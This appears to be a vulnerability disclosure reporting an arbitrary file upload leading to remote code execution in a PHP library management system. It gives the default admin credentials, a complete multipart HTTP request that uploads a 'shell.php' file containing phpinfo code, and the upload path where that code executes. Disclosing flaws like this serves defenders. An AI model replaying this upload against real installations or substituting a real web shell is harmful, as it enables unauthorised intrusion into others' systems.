# Library Management System v1.0 by kingbhob02 has arbitrary code execution (RCE)

BUG_Author: z1pwn

Login account: admin/admin (Super Admin account)

Vulnerability url: ip/LMS/card/index.php

vendors: https://www.sourcecodester.com/php/15434/library-management-system-qr-code-attendance-and-auto-generate-library-card.html

Loophole location: There is an arbitrary file upload vulnerability (RCE) in the file upload point in the add card function in the card module.

Request package for file upload：

```sql
POST /LMS/card/index.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/LMS/card/index.php
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=7v8p4p3goshl3b4fkncu3bh9ui
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------66472804728953
Content-Length: 1010

-----------------------------66472804728953
Content-Disposition: form-data; name="name"

2
-----------------------------66472804728953
Content-Disposition: form-data; name="grade"

Education
-----------------------------66472804728953
Content-Disposition: form-data; name="dob"

Staff
-----------------------------66472804728953
Content-Disposition: form-data; name="address"

2
-----------------------------66472804728953
Content-Disposition: form-data; name="email"

2
-----------------------------66472804728953
Content-Disposition: form-data; name="exp_date"

2
-----------------------------66472804728953
Content-Disposition: form-data; name="id_no"

2
-----------------------------66472804728953
Content-Disposition: form-data; name="phone"

2
-----------------------------66472804728953
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------66472804728953--
```

The files will be uploaded to this directory LMS\card\assets\uploads

![image](https://user-images.githubusercontent.com/49387143/180378259-21567886-60b8-43e7-8511-14a9592cfe9c.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/49387143/180378390-37501c1c-e1ee-4da3-893d-1bd1618ce078.png)
